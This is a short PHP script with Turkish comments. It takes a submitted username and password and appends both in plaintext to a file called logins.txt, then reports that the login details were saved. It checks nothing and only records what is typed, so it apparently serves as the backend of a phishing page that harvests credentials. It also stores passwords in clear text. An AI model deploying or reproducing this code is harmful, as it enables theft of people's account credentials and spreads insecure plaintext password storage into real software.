<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Kullanıcı adı ve şifreyi dosyaya ekle
    $file = fopen("logins.txt", "a");
    fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");
    fclose($file);

    echo "Giriş bilgileri başarıyla kaydedildi!";
}
?>
